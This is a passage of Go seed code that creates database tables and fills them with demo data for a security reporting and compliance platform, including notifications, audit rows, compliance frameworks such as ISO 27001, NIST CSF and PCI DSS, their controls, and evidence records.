	for _, s := range shares {
		var exp interface{} = nil
		if s.hrsExpiry > 0 {
			t2 := now.Add(time.Duration(s.hrsExpiry)*time.Hour - time.Duration(s.minsAgo)*time.Minute)
			exp = t2
		}
		mustExec(db, `INSERT INTO rpe_shared (tenant_id, share_id, report_id, report_name, execution_id, shared_by, share_type, view_count, expires_at, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) ON CONFLICT DO NOTHING`,
			tid, s.id, s.reportID, s.reportName, s.execID, s.sharedBy, s.shareType, s.viewCount,
			exp, now.Add(-time.Duration(s.minsAgo)*time.Minute),
		)
	}

	// ── notifications ─────────────────────────────────────────────────────────
	type rpeNotif struct {
		etype, title, msg, sev, reportID, reportName string
		minsAgo                                       int
		read                                          bool
	}
	notifs := []rpeNotif{
		{"report_generated", "Report Generated", "Daily SOC Report — 2025-07-17 generated successfully (PDF, 278 KB)", "info", "RPT-014", "Daily SOC Report — 2025-07-17", 5, false},
		{"report_generated", "Report Generated", "Weekly SOC Report — W28 2025 generated (PDF, 500 KB)", "info", "RPT-001", "Weekly SOC Report — W28 2025", 32, false},
		{"report_failed", "Report Generation Failed", "Endpoint Health Report failed — EDR data source timeout. Retry in 5 min.", "high", "RPT-009", "Endpoint Health Report — July", 2880, false},
		{"scheduled_completed", "Scheduled Report Completed", "Vulnerability Assessment — Production delivered via download portal (XLSX)", "info", "RPT-004", "Vulnerability Assessment — Production", 125, true},
		{"report_shared", "Report Shared Externally", "PCI DSS Compliance Assessment Q2 shared externally by bob.patel@corp.com (expires 30 days)", "medium", "RPT-003", "PCI DSS Compliance Assessment Q2", 4325, true},
		{"export_completed", "Export Completed", "Asset Inventory Report exported as CSV (1.7 MB) — ready for download", "info", "RPT-013", "Asset Inventory Report", 725, true},
		{"report_generated", "Scheduled Report Completed", "Risk Posture Summary — July 2025 generated on schedule (PDF)", "info", "RPT-015", "Risk Posture Summary — July 2025", 2165, true},
		{"report_scheduled", "New Schedule Created", "MITRE ATT&CK Coverage Analysis scheduled quarterly (paused — pending approval)", "medium", "RPT-007", "MITRE ATT&CK Coverage Analysis", 5040, true},
	}
	for _, n := range notifs {
		mustExec(db, `INSERT INTO rpe_notifications (tenant_id, event_type, title, message, severity, report_id, report_name, read, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
			tid, n.etype, n.title, n.msg, n.sev, n.reportID, n.reportName, n.read,
			now.Add(-time.Duration(n.minsAgo)*time.Minute),
		)
	}

	// ── versions ─────────────────────────────────────────────────────────────
	type rpeVersion struct {
		reportID, author, changes string
		version, daysAgo          int
	}
	versions := []rpeVersion{
		{"RPT-001", "alice.zhang@corp.com", "Added MITRE ATT&CK heatmap section; updated threat analysis data sources", 3, 0},
		{"RPT-001", "alice.zhang@corp.com", "Expanded incident timeline to include containment actions", 2, 7},
		{"RPT-001", "bob.patel@corp.com", "Initial version — weekly SOC template applied", 1, 14},
		{"RPT-002", "carol.kim@corp.com", "Added board-level risk score visualization; revised executive summary", 4, 2},
		{"RPT-002", "carol.kim@corp.com", "Removed technical vulnerability details per CISO feedback", 3, 30},
		{"RPT-003", "bob.patel@corp.com", "Added cardholder data environment scope section", 2, 5},
		{"RPT-003", "bob.patel@corp.com", "Initial PCI DSS template", 1, 90},
		{"RPT-004", "alice.zhang@corp.com", "Added CVSS v4 scoring column; updated remediation SLA table", 2, 1},
		{"RPT-004", "alice.zhang@corp.com", "Initial vulnerability assessment — production scope", 1, 8},
	}
	for _, v := range versions {
		genAt := now.Add(-time.Duration(v.daysAgo) * 24 * time.Hour)
		mustExec(db, `INSERT INTO rpe_versions (tenant_id, report_id, version, author, changes, generated_at, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7)`,
			tid, v.reportID, v.version, v.author, v.changes, genAt, genAt,
		)
	}

	// ── audit trail ──────────────────────────────────────────────────────────
	type rpeAuditRow struct {
		action, otype, oid, oname, actor, details string
		minsAgo                                    int
	}
	auditRows := []rpeAuditRow{
		{"report_generated", "report", "RPT-014", "Daily SOC Report — 2025-07-17", "system", "Scheduled generation — PDF, 278 KB, 2.3s", 5},
		{"report_generated", "report", "RPT-001", "Weekly SOC Report — W28 2025", "alice.zhang@corp.com", "Manual generation — PDF, 500 KB, 4.8s", 32},
		{"report_scheduled", "schedule", "SCH-002", "Weekly SOC Report — W28 2025", "alice.zhang@corp.com", "Frequency: weekly, Delivery: email, Recipients: 2", 90},
		{"report_shared", "report", "RPT-001", "Weekly SOC Report — W28 2025", "alice.zhang@corp.com", "Internal share link created — no expiry", 32},
		{"report_exported", "report", "RPT-004", "Vulnerability Assessment — Production", "alice.zhang@corp.com", "XLSX export — 1.2 MB", 125},
		{"report_created", "report", "RPT-016", "Firewall Activity Report — July", "bob.patel@corp.com", "Category: endpoint_network, Sources: Firewall, SIEM", 2880},
		{"report_generated", "report", "RPT-004", "Vulnerability Assessment — Production", "system", "Scheduled generation — XLSX, 1.2 MB, 8.9s", 125},
		{"report_shared", "report", "RPT-003", "PCI DSS Compliance Assessment Q2", "bob.patel@corp.com", "External share — 30 day expiry, password protected", 4325},
		{"template_created", "template", "TPL-009", "Security Operations", "carol.kim@corp.com", "Built-in template registered — 9 sections, 3 data sources", 10080},
		{"report_generated", "report", "RPT-007", "MITRE ATT&CK Coverage Analysis", "bob.patel@corp.com", "Manual generation — PDF, 900 KB, 6.4s", 1442},
		{"schedule_modified", "schedule", "SCH-008", "MITRE ATT&CK Coverage Analysis", "carol.kim@corp.com", "Status changed: active → paused pending approval", 2880},
		{"report_deleted", "report", "RPT-OLD-01", "Legacy FTP Security Report (Deprecated)", "alice.zhang@corp.com", "Superseded by Firewall Activity Report", 7200},
		{"report_created", "report", "RPT-018", "GDPR Compliance Review", "carol.kim@corp.com", "Category: compliance, GDPR framework template applied", 64800},
	}
	for _, a := range auditRows {
		mustExec(db, `INSERT INTO rpe_audit (tenant_id, action, object_type, object_id, object_name, actor, details, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, a.action, a.otype, a.oid, a.oname, a.actor, a.details,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
		)
	}

	log.Printf("Reports enterprise seed: %d templates, %d reports, %d schedules, %d executions, %d exports, %d shares, %d notifications, %d versions, %d audit",
		len(templates), len(reports), len(schedules), len(executions), len(exports), len(shares), len(notifs), len(versions), len(auditRows))
}

func seedFrameworkComplianceEnterprise(db *sql.DB) {
	tid := 9999
	now := time.Now()

	// ── tables ────────────────────────────────────────────────────────────────
	tables := []string{
		`CREATE TABLE IF NOT EXISTS fce_frameworks (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			framework_id TEXT NOT NULL, name TEXT NOT NULL,
			version TEXT DEFAULT '1.0',
			category TEXT NOT NULL DEFAULT 'security',
			description TEXT,
			total_controls INTEGER DEFAULT 0,
			passed_controls INTEGER DEFAULT 0,
			failed_controls INTEGER DEFAULT 0,
			not_applicable INTEGER DEFAULT 0,
			not_assessed INTEGER DEFAULT 0,
			overall_score INTEGER DEFAULT 0,
			compliance_status TEXT DEFAULT 'not_assessed',
			last_assessment_at TIMESTAMP,
			next_assessment_at TIMESTAMP,
			owner TEXT,
			is_active BOOLEAN DEFAULT TRUE,
			is_builtin BOOLEAN DEFAULT FALSE,
			tags TEXT DEFAULT '[]',
			created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW(),
			UNIQUE(tenant_id, framework_id)
		)`,
		`CREATE TABLE IF NOT EXISTS fce_controls (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			framework_id TEXT NOT NULL, control_id TEXT NOT NULL,
			name TEXT NOT NULL, description TEXT,
			category TEXT NOT NULL DEFAULT 'general',
			priority TEXT NOT NULL DEFAULT 'medium',
			requirement TEXT,
			assessment_status TEXT NOT NULL DEFAULT 'not_assessed',
			risk_level TEXT NOT NULL DEFAULT 'medium',
			owner TEXT,
			evidence_count INTEGER DEFAULT 0,
			notes TEXT,
			last_reviewed_at TIMESTAMP,
			reviewed_by TEXT,
			score INTEGER DEFAULT 0,
			created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS fce_evidence (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			evidence_id TEXT NOT NULL UNIQUE,
			framework_id TEXT NOT NULL, control_id TEXT,
			name TEXT NOT NULL, description TEXT,
			evidence_type TEXT NOT NULL DEFAULT 'document',
			file_name TEXT, file_size_bytes BIGINT DEFAULT 0,
			file_hash TEXT,
			source TEXT,
			uploaded_by TEXT NOT NULL,
			verified BOOLEAN DEFAULT FALSE,
			verified_by TEXT, verified_at TIMESTAMP,
			expires_at TIMESTAMP,
			tags TEXT DEFAULT '[]',
			created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS fce_assessments (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			assessment_id TEXT NOT NULL UNIQUE,
			framework_id TEXT NOT NULL, framework_name TEXT NOT NULL,
			assessment_type TEXT NOT NULL DEFAULT 'manual',
			status TEXT NOT NULL DEFAULT 'in_progress',
			started_at TIMESTAMP DEFAULT NOW(), completed_at TIMESTAMP,
			started_by TEXT NOT NULL,
			total_controls INTEGER DEFAULT 0,
			passed INTEGER DEFAULT 0, failed INTEGER DEFAULT 0,
			not_applicable INTEGER DEFAULT 0, not_assessed INTEGER DEFAULT 0,
			score INTEGER DEFAULT 0,
			findings TEXT,
			notes TEXT,
			created_at TIMESTAMP DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS fce_remediations (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			remediation_id TEXT NOT NULL UNIQUE,
			framework_id TEXT NOT NULL, control_id TEXT NOT NULL,
			control_name TEXT NOT NULL,
			title TEXT NOT NULL, description TEXT,
			priority TEXT NOT NULL DEFAULT 'medium',
			status TEXT NOT NULL DEFAULT 'open',
			assigned_to TEXT, assigned_team TEXT,
			due_date DATE,
			linked_vulns TEXT DEFAULT '[]',
			linked_cases TEXT DEFAULT '[]',
			linked_playbooks TEXT DEFAULT '[]',
			verification_status TEXT DEFAULT 'unverified',
			verified_by TEXT, verified_at TIMESTAMP,
			closed_at TIMESTAMP,
			notes TEXT,
			created_by TEXT NOT NULL,
			created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS fce_notifications (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			event_type TEXT NOT NULL,
			title TEXT NOT NULL, message TEXT NOT NULL,
			framework_id TEXT, control_id TEXT,
			severity TEXT NOT NULL DEFAULT 'info',
			read BOOLEAN DEFAULT FALSE,
			created_at TIMESTAMP DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS fce_audit (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			action TEXT NOT NULL,
			object_type TEXT NOT NULL,
			object_id TEXT, object_name TEXT,
			actor TEXT NOT NULL,
			details TEXT,
			created_at TIMESTAMP DEFAULT NOW()
		)`,
	}
	for _, q := range tables {
		mustExec(db, q)
	}

	// ── 30+ frameworks ────────────────────────────────────────────────────────
	type fwRow struct {
		fid, name, version, category, description, owner, status string
		total, passed, failed, na, notAssessed, score              int
		daysAgo                                                     int
		builtin                                                     bool
	}
	frameworks := []fwRow{
		// Security
		{"ISO-27001", "ISO/IEC 27001:2022", "2022", "security", "Information security management system standard", "alice.zhang@corp.com", "partially_compliant", 114, 82, 24, 8, 0, 78, 7, true},
		{"NIST-CSF", "NIST Cybersecurity Framework", "1.1", "security", "Five-function cybersecurity framework — Identify, Protect, Detect, Respond, Recover", "alice.zhang@corp.com", "partially_compliant", 98, 71, 18, 9, 0, 74, 3, true},
		{"NIST-800-53", "NIST SP 800-53 Rev 5", "5.0", "security", "Security and privacy controls for federal information systems", "bob.patel@corp.com", "partially_compliant", 256, 178, 48, 30, 0, 72, 14, true},
		{"CIS-CONTROLS", "CIS Controls v8", "8.0", "security", "Prioritized set of actions to protect against cyber attacks", "alice.zhang@corp.com", "compliant", 153, 128, 15, 10, 0, 85, 5, true},
		{"SOC2-TYPE2", "SOC 2 Type II", "2023", "security", "Trust service criteria — Security, Availability, Confidentiality, Privacy", "carol.kim@corp.com", "partially_compliant", 64, 42, 16, 6, 0, 69, 21, true},
		{"ISO-27002", "ISO/IEC 27002:2022", "2022", "security", "Information security controls guidance aligned with ISO 27001", "alice.zhang@corp.com", "partially_compliant", 93, 68, 19, 6, 0, 74, 10, true},
		{"MITRE-DEFEND", "MITRE D3FEND", "1.0", "security", "Defensive countermeasures knowledge graph", "bob.patel@corp.com", "not_assessed", 45, 18, 12, 5, 10, 50, 30, true},
		// Cloud
		{"CIS-AZURE", "CIS Azure Foundations Benchmark", "2.0", "cloud", "Security best practices for Microsoft Azure cloud environments", "bob.patel@corp.com", "partially_compliant", 86, 62, 18, 6, 0, 74, 6, true},
		{"CIS-AWS", "CIS Amazon Web Services Foundations", "2.0", "cloud", "Security configuration recommendations for AWS accounts", "bob.patel@corp.com", "compliant", 97, 84, 8, 5, 0, 88, 4, true},
		{"CIS-GCP", "CIS Google Cloud Platform Foundation", "1.3", "cloud", "Security best practices for Google Cloud Platform", "carol.kim@corp.com", "partially_compliant", 74, 51, 16, 7, 0, 72, 9, true},
		{"AWS-WELL-ARCH", "AWS Well-Architected Framework", "2023", "cloud", "Five pillars: Operational Excellence, Security, Reliability, Performance, Cost", "carol.kim@corp.com", "compliant", 58, 49, 7, 2, 0, 86, 15, true},
		{"AZURE-SECURITY", "Microsoft Azure Security Benchmark", "3.0", "cloud", "Microsoft's cloud security baseline for Azure services", "bob.patel@corp.com", "partially_compliant", 90, 63, 20, 7, 0, 72, 8, true},
		{"CSA-CCM", "CSA Cloud Controls Matrix", "4.0.6", "cloud", "Cloud-specific security controls for cloud service providers", "carol.kim@corp.com", "partially_compliant", 197, 139, 40, 18, 0, 72, 12, true},
		// Privacy
		{"GDPR", "General Data Protection Regulation", "2018", "privacy", "EU data protection and privacy regulation", "carol.kim@corp.com", "partially_compliant", 99, 71, 22, 6, 0, 74, 6, true},
		{"CCPA", "California Consumer Privacy Act", "2023", "privacy", "California's consumer privacy rights and business obligations", "carol.kim@corp.com", "compliant", 42, 37, 3, 2, 0, 90, 8, true},
		{"ISO-27701", "ISO/IEC 27701:2019", "2019", "privacy", "Privacy information management extension to ISO 27001/27002", "carol.kim@corp.com", "partially_compliant", 56, 39, 13, 4, 0, 72, 18, true},
		{"NIST-PRIVACY", "NIST Privacy Framework", "1.0", "privacy", "Privacy risk management framework aligned with NIST CSF", "carol.kim@corp.com", "partially_compliant", 100, 68, 24, 8, 0, 70, 25, true},
		// Financial
		{"PCI-DSS", "PCI DSS", "4.0", "financial", "Payment Card Industry Data Security Standard", "bob.patel@corp.com", "partially_compliant", 264, 183, 62, 19, 0, 71, 5, true},
		{"SOX-ITGC", "Sarbanes-Oxley IT General Controls", "2023", "financial", "IT control framework for SOX financial reporting compliance", "alice.zhang@corp.com", "compliant", 47, 42, 4, 1, 0, 91, 30, true},
		{"SWIFT-CSCF", "SWIFT Customer Security Controls Framework", "2023", "financial", "Mandatory and advisory security controls for SWIFT users", "bob.patel@corp.com", "partially_compliant", 32, 22, 8, 2, 0, 72, 20, true},
		// Healthcare
		{"HIPAA", "HIPAA Security Rule", "2013", "healthcare", "Health Insurance Portability and Accountability Act security standards", "alice.zhang@corp.com", "compliant", 54, 48, 5, 1, 0, 90, 12, true},
		{"HITRUST", "HITRUST CSF", "11.0", "healthcare", "Health Information Trust Alliance Common Security Framework", "alice.zhang@corp.com", "partially_compliant", 156, 108, 36, 12, 0, 71, 16, true},
		// Additional Security
		{"OWASP-ASVS", "OWASP Application Security Verification Standard", "4.0.3", "security", "Framework for specifying and verifying secure application requirements", "bob.patel@corp.com", "partially_compliant", 286, 196, 64, 26, 0, 70, 22, true},
		{"IEC-62443", "IEC 62443 — Industrial Cybersecurity", "2020", "security", "Security standard for industrial automation and control systems", "bob.patel@corp.com", "not_assessed", 89, 30, 20, 10, 29, 45, 45, true},
		{"TISAX", "TISAX — Trusted Information Security Assessment Exchange", "6.0", "security", "Automotive industry information security assessment standard", "carol.kim@corp.com", "partially_compliant", 79, 55, 18, 6, 0, 71, 28, true},
		{"CMMC-2", "CMMC Level 2", "2.0", "security", "Cybersecurity Maturity Model Certification for defense contractors", "bob.patel@corp.com", "partially_compliant", 110, 76, 26, 8, 0, 71, 11, true},
		{"FedRAMP", "FedRAMP Moderate", "2023", "cloud", "Federal Risk and Authorization Management Program", "alice.zhang@corp.com", "partially_compliant", 325, 228, 72, 25, 0, 71, 19, true},
		{"ENS", "Spanish National Security Framework (ENS)", "2022", "security", "Esquema Nacional de Seguridad — Spanish government security framework", "carol.kim@corp.com", "not_assessed", 75, 20, 10, 5, 40, 50, 60, false},
		{"CUSTOM-DEVOPS", "Internal DevSecOps Framework", "1.2", "custom", "Custom security controls for CI/CD pipelines and developer workflows", "bob.patel@corp.com", "compliant", 38, 35, 2, 1, 0, 94, 3, false},
		{"CUSTOM-VENDOR", "Third-Party Vendor Security", "2.0", "custom", "Supplier and vendor security assessment criteria", "alice.zhang@corp.com", "partially_compliant", 24, 17, 6, 1, 0, 72, 7, false},
	}

	for _, fw := range frameworks {
		lastAssessAt := now.Add(-time.Duration(fw.daysAgo) * 24 * time.Hour)
		nextAssessAt := now.Add(90 * 24 * time.Hour)
		mustExec(db, `INSERT INTO fce_frameworks
			(tenant_id, framework_id, name, version, category, description, owner,
			 total_controls, passed_controls, failed_controls, not_applicable, not_assessed,
			 overall_score, compliance_status, last_assessment_at, next_assessment_at,
			 is_active, is_builtin, tags, created_at, updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,TRUE,$17,'[]',$18,$18)
			ON CONFLICT (tenant_id, framework_id) DO NOTHING`,
			tid, fw.fid, fw.name, fw.version, fw.category, fw.description, fw.owner,
			fw.total, fw.passed, fw.failed, fw.na, fw.notAssessed,
			fw.score, fw.status, lastAssessAt, nextAssessAt, fw.builtin, now,
		)
	}

	// ── controls (ISO 27001 and NIST CSF as representative samples) ──────────
	type ctrlRow struct {
		fid, cid, name, category, priority, status, risk, owner, requirement string
		score, evidenceCount                                                    int
	}
	controls := []ctrlRow{
		// ISO 27001 controls
		{"ISO-27001", "A.5.1", "Information Security Policies", "governance", "high", "passed", "medium", "alice.zhang@corp.com", "Management-approved policies for information security", 90, 3},
		{"ISO-27001", "A.5.2", "Information Security Roles and Responsibilities", "governance", "high", "passed", "medium", "alice.zhang@corp.com", "Allocation of information security responsibilities", 85, 2},
		{"ISO-27001", "A.6.1", "Screening", "people", "medium", "passed", "medium", "alice.zhang@corp.com", "Background verification checks on all candidates", 80, 1},
		{"ISO-27001", "A.6.3", "Information Security Awareness", "people", "medium", "passed", "low", "alice.zhang@corp.com", "Annual security awareness training for all staff", 92, 4},
		{"ISO-27001", "A.7.1", "Physical Security Perimeter", "physical", "high", "passed", "medium", "bob.patel@corp.com", "Secure areas to protect information and assets", 88, 2},
		{"ISO-27001", "A.8.2", "Privileged Access Rights", "access_control", "critical", "failed", "critical", "alice.zhang@corp.com", "Privileged access allocation and restriction", 42, 0},
		{"ISO-27001", "A.8.3", "Information Access Restriction", "access_control", "high", "passed", "high", "alice.zhang@corp.com", "Access to information restricted to authorized users", 78, 2},
		{"ISO-27001", "A.8.5", "Secure Authentication", "access_control", "critical", "passed", "high", "alice.zhang@corp.com", "Secure authentication technology for all users", 82, 3},
		{"ISO-27001", "A.8.7", "Protection Against Malware", "operations", "high", "passed", "high", "bob.patel@corp.com", "Protection against malware using detection and response", 91, 5},
		{"ISO-27001", "A.8.8", "Management of Technical Vulnerabilities", "operations", "critical", "failed", "critical", "bob.patel@corp.com", "Timely vulnerability identification and remediation", 38, 1},
		{"ISO-27001", "A.8.12", "Data Leakage Prevention", "operations", "high", "failed", "high", "carol.kim@corp.com", "DLP measures to prevent unauthorized data exfiltration", 30, 0},
		{"ISO-27001", "A.8.15", "Logging", "operations", "high", "passed", "medium", "bob.patel@corp.com", "Activity logs produced, stored and protected", 88, 4},
		{"ISO-27001", "A.8.16", "Monitoring Activities", "operations", "high", "passed", "medium", "bob.patel@corp.com", "Networks, systems and applications monitored for anomalies", 85, 3},
		{"ISO-27001", "A.8.23", "Web Filtering", "operations", "medium", "passed", "medium", "bob.patel@corp.com", "Access to external websites managed to reduce exposure", 80, 2},
		{"ISO-27001", "A.8.24", "Use of Cryptography", "cryptography", "high", "passed", "high", "alice.zhang@corp.com", "Rules for encryption of information", 84, 2},
		{"ISO-27001", "A.8.28", "Secure Coding", "development", "high", "failed", "high", "bob.patel@corp.com", "Secure coding principles applied in software development", 45, 1},
		{"ISO-27001", "A.5.24", "Information Security Incident Management Planning", "incidents", "critical", "passed", "medium", "alice.zhang@corp.com", "Incident response and escalation procedures", 87, 4},
		{"ISO-27001", "A.5.29", "Information Security During Disruption", "continuity", "high", "passed", "medium", "carol.kim@corp.com", "Plans for information security continuity", 83, 3},
		{"ISO-27001", "A.5.34", "Privacy and Protection of PII", "privacy", "critical", "failed", "critical", "carol.kim@corp.com", "Personal data protection aligned with regulation", 40, 0},
		{"ISO-27001", "A.5.36", "Compliance with Policies", "compliance", "medium", "passed", "low", "alice.zhang@corp.com", "Compliance with information security policies", 90, 2},
		// NIST CSF controls
		{"NIST-CSF", "ID.AM-1", "Physical devices and systems inventoried", "identify", "high", "passed", "medium", "bob.patel@corp.com", "Inventory of physical assets maintained", 88, 3},
		{"NIST-CSF", "ID.AM-2", "Software platforms and applications inventoried", "identify", "high", "passed", "medium", "bob.patel@corp.com", "Inventory of software assets maintained", 85, 2},
		{"NIST-CSF", "ID.AM-6", "Cybersecurity roles and responsibilities established", "identify", "medium", "passed", "low", "alice.zhang@corp.com", "Roles for entire workforce and third-parties established", 90, 2},
		{"NIST-CSF", "ID.RA-1", "Asset vulnerabilities are identified and documented", "identify", "critical", "passed", "high", "bob.patel@corp.com", "Vulnerability scanning performed regularly", 82, 4},
		{"NIST-CSF", "ID.RA-3", "Threats to organizational objectives identified", "identify", "high", "passed", "medium", "alice.zhang@corp.com", "Threat intelligence consumed and analyzed", 80, 3},
		{"NIST-CSF", "PR.AC-1", "Identities and credentials managed for authorized devices", "protect", "critical", "passed", "high", "alice.zhang@corp.com", "Identity lifecycle management including MFA", 78, 3},
		{"NIST-CSF", "PR.AC-3", "Remote access managed", "protect", "high", "passed", "medium", "alice.zhang@corp.com", "VPN with MFA for all remote access", 85, 2},
		{"NIST-CSF", "PR.AC-5", "Network integrity protected", "protect", "high", "passed", "medium", "bob.patel@corp.com", "Network segmentation and DMZ in place", 83, 3},
		{"NIST-CSF", "PR.DS-1", "Data at rest protected", "protect", "critical", "passed", "high", "carol.kim@corp.com", "Encryption at rest for all sensitive data", 87, 4},
		{"NIST-CSF", "PR.DS-2", "Data in transit protected", "protect", "critical", "passed", "high", "carol.kim@corp.com", "TLS 1.2+ enforced for all data in transit", 92, 3},
		{"NIST-CSF", "PR.IP-9", "Response plans in place", "protect", "high", "failed", "high", "alice.zhang@corp.com", "Incident response plan tested and updated", 48, 1},
		{"NIST-CSF", "DE.AE-1", "Network operations baseline established", "detect", "high", "passed", "medium", "bob.patel@corp.com", "Baseline of network operations established", 80, 2},
		{"NIST-CSF", "DE.AE-2", "Detected events analyzed to understand targets", "detect", "high", "passed", "medium", "bob.patel@corp.com", "Security events correlated and analyzed", 82, 3},
		{"NIST-CSF", "DE.AE-5", "Incident alert thresholds established", "detect", "medium", "passed", "medium", "bob.patel@corp.com", "Alert thresholds tuned to reduce false positives", 75, 2},
		{"NIST-CSF", "DE.CM-1", "Network monitored to detect attack events", "detect", "critical", "passed", "high", "bob.patel@corp.com", "IDS/IPS with 24x7 monitoring", 88, 4},
		{"NIST-CSF", "DE.CM-7", "Monitoring for unauthorized personnel", "detect", "high", "passed", "medium", "alice.zhang@corp.com", "Physical and logical access monitoring", 84, 2},
		{"NIST-CSF", "RS.CO-3", "Information shared consistent with response plans", "respond", "high", "failed", "high", "alice.zhang@corp.com", "Communication plan tested in tabletop exercises", 40, 0},
		{"NIST-CSF", "RS.MI-1", "Incidents contained", "respond", "critical", "passed", "high", "alice.zhang@corp.com", "Containment procedures executed within SLA", 82, 3},
		{"NIST-CSF", "RC.RP-1", "Recovery plan executed during or after incident", "recover", "high", "passed", "medium", "carol.kim@corp.com", "Business continuity plan tested annually", 80, 2},
		{"NIST-CSF", "RC.CO-3", "Recovery activities communicated to stakeholders", "recover", "medium", "passed", "low", "carol.kim@corp.com", "Post-incident recovery comms to affected parties", 85, 1},
		// PCI DSS controls (sample)
		{"PCI-DSS", "1.1", "Firewall configuration standards established", "network_security", "critical", "passed", "high", "bob.patel@corp.com", "Formal firewall configuration and change management", 85, 4},
		{"PCI-DSS", "2.2", "Vendor-supplied defaults changed", "system_config", "critical", "passed", "critical", "bob.patel@corp.com", "Default passwords changed and unnecessary services disabled", 90, 3},
		{"PCI-DSS", "3.4", "Primary account numbers masked where displayed", "data_protection", "critical", "passed", "critical", "carol.kim@corp.com", "PAN masked to show only first 6 and last 4 digits", 92, 3},
		{"PCI-DSS", "6.4.3", "Payment page script integrity validated", "application_security", "critical", "failed", "critical", "bob.patel@corp.com", "All scripts on payment pages authorized and integrity verified", 0, 0},
		{"PCI-DSS", "8.3.1", "User identities confirmed before account creation", "access_control", "high", "passed", "high", "alice.zhang@corp.com", "Identity verification process for new accounts", 88, 2},
		{"PCI-DSS", "10.2", "Audit logs implemented for all system components", "logging", "critical", "passed", "high", "bob.patel@corp.com", "Audit logging covers all required event categories", 87, 5},
		{"PCI-DSS", "11.3.1", "External penetration test performed", "testing", "critical", "failed", "critical", "bob.patel@corp.com", "Annual external pen test by qualified tester", 0, 0},
		{"PCI-DSS", "12.10.1", "Incident response plan reviewed", "incident_response", "high", "passed", "medium", "alice.zhang@corp.com", "Annual review and testing of IR plan", 84, 3},
	}

	for _, c := range controls {
		reviewedAt := now.Add(-time.Duration(14) * 24 * time.Hour)
		mustExec(db, `INSERT INTO fce_controls
			(tenant_id, framework_id, control_id, name, category, priority, assessment_status, risk_level, owner, requirement, score, evidence_count, last_reviewed_at, reviewed_by, created_at, updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$15)
			ON CONFLICT DO NOTHING`,
			tid, c.fid, c.cid, c.name, c.category, c.priority,
			c.status, c.risk, c.owner, c.requirement,
			c.score, c.evidenceCount, reviewedAt, c.owner, now,
		)
	}

	// ── evidence ──────────────────────────────────────────────────────────────
	type evidRow struct {
		eid, fid, cid, name, etype, fname, source, uploader string
		verified                                              bool
		daysAgo                                               int
	}
	evidences := []evidRow{
		{"EVD-001", "ISO-27001", "A.8.15", "Q2 2025 Security Log Retention Report", "report", "log_retention_q2_2025.pdf", "SIEM", "alice.zhang@corp.com", true, 5},
		{"EVD-002", "ISO-27001", "A.8.7", "Endpoint Protection Deployment Evidence", "screenshot", "edr_coverage_dashboard.png", "CrowdStrike", "bob.patel@corp.com", true, 3},
		{"EVD-003", "ISO-27001", "A.5.24", "Incident Response Plan v3.2", "document", "ir_plan_v3.2.pdf", "Confluence", "alice.zhang@corp.com", true, 30},
		{"EVD-004", "NIST-CSF", "ID.AM-1", "CMDB Asset Inventory Export", "report", "cmdb_export_2025q2.xlsx", "ServiceNow", "bob.patel@corp.com", true, 10},
		{"EVD-005", "NIST-CSF", "PR.DS-1", "Encryption at Rest Configuration", "config", "encryption_config.json", "AWS KMS", "carol.kim@corp.com", true, 20},
		{"EVD-006", "PCI-DSS", "1.1", "Firewall Ruleset Review Q2 2025", "document", "fw_review_q2_2025.pdf", "Internal", "bob.patel@corp.com", true, 14},
		{"EVD-007", "PCI-DSS", "10.2", "Audit Log Samples — June 2025", "log", "audit_log_sample_june.zip", "Splunk", "bob.patel@corp.com", false, 2},
		{"EVD-008", "NIST-CSF", "PR.AC-1", "MFA Enrollment Report — July 2025", "report", "mfa_enrollment_july.pdf", "Azure AD", "alice.zhang@corp.com", true, 1},
		{"EVD-009", "ISO-27001", "A.8.24", "TLS Configuration Audit", "report", "tls_audit_2025.pdf", "Qualys", "bob.patel@corp.com", false, 7},
		{"EVD-010", "PCI-DSS", "3.4", "PAN Masking Implementation Evidence", "screenshot", "pan_masking_test.png", "QA Environment", "carol.kim@corp.com", true, 45},
		{"EVD-011", "GDPR", "", "GDPR Privacy Impact Assessment 2025", "document", "pia_2025.pdf", "Legal", "carol.kim@corp.com", true, 60},
		{"EVD-012", "HIPAA", "", "Annual HIPAA Risk Assessment", "report", "hipaa_risk_2025.pdf", "Compliance", "alice.zhang@corp.com", true, 90},
		{"EVD-013", "CIS-AWS", "", "AWS CIS Benchmark Scan Report", "report", "aws_cis_scan_july.pdf", "AWS Security Hub", "bob.patel@corp.com", true, 4},
		{"EVD-014", "SOC2-TYPE2", "", "SOC 2 Type II Readiness Assessment", "report", "soc2_readiness_2025.pdf", "External Auditor", "carol.kim@corp.com", false, 15},
		{"EVD-015", "ISO-27001", "A.5.1", "Information Security Policy v4.1", "document", "iss_policy_v4.1.pdf", "SharePoint", "alice.zhang@corp.com", true, 180},
	}

	for _, e := range evidences {
		createdAt := now.Add(-time.Duration(e.daysAgo) * 24 * time.Hour)
		var verifiedAt interface{}
		var verifiedBy interface{}
		if e.verified {
			vat := createdAt.Add(24 * time.Hour)
			verifiedAt = vat
